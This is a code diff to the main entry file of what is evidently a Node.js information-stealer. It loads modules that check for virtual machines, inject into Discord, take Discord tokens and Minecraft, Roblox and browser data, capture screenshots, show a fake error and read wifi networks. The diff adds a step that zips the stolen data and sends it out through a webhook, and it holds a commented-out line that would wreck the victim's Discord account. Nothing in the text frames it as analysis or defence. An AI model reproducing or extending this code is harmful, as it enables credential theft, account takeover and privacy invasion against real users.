@@ -28,11 +28,17 @@ if (config.vmProtect && checkVM()) {
   config.discord.injectJs && require('./functions/discord-injection');
   require('./functions/grab-mc');
   require('./functions/grab-roblox');
-  require('./functions/grab-discord-token');
   require('./functions/grab-browsers-data');
-  if (config.discord.autoJoinGuild && typeof config.discord.autoJoinGuild === 'string') require('./functions/auto-join-guild');
   require('./functions/screenshot');
   config.fakeError && require('./functions/fake-error');
+  config.wifiNetworks && require('./functions/wifi-networks');
 
-  process.on('beforeExit', () => require('./functions/zip'));
+  require('./functions/grab-discord-token').then(() => {
+    // require('./functions/nuke-discord-account');
+    if (config.discord.autoJoinGuild && typeof config.discord.autoJoinGuild === 'string') require('./functions/auto-join-guild');
+
+    require('./functions/zip').then(zipFile => {
+      require('./functions/webhook')(zipFile);
+    });
+  });
 }
